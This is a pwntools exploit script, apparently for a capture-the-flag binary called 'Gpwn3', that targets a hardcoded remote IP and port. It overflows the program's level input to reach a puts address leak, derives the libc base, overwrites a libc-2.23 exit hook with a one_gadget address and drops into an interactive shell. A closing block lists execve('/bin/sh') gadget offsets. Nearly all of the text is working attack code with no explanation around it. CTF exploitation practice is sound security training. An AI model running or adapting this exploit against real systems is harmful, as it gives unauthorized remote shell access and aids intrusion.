from pwn import *
from time import sleep
#coding=utf-8

context(arch="amd64", os="linux")
context.log_level='debug'

ip = '113.201.14.253'
port = '16033'
reomote_addr = [ip,port]
binary = './Gpwn3'

libc = ELF('./libc-2.23.so')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base


def menu(idx):
	ru('You choice:')
	sl(str(idx))

def create(content):
	menu(1)
	ru("Give me a character level :\n")
	sd(content)
	p.recv()

def up(content):
	menu(2)
	ru("Give me another level :\n")
	sl(content)

# attach(p,'b *$rebase(0x00000000000DF0)')
payload = 'aaaaaaaa\x00\x00\x00'.ljust(0x24,'a')
create(payload)
payload1 = '\xFF'*0x1C

up(payload1)

up(p32(0x7FFFFFFF))

ru('You choice:')
sl(str(3))
ru("Try to baokou")
sleep(1)
ru("Here's your reward: ")

addr = int(rv(len("0x7f4ddbbe15a0")),16)
print "puts=>"+hex(addr)

libc_base = addr - libc.sym['puts']

print "libc_base=>"+hex(libc_base)
exit_hook = libc_base+0x5f0040+3848
shell = 0xf1247+libc_base

ru("Warrior,please leave your name:")
sd(p64(exit_hook))
ru("We'll have a statue made for you!")
sd(p64(shell))

it()
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
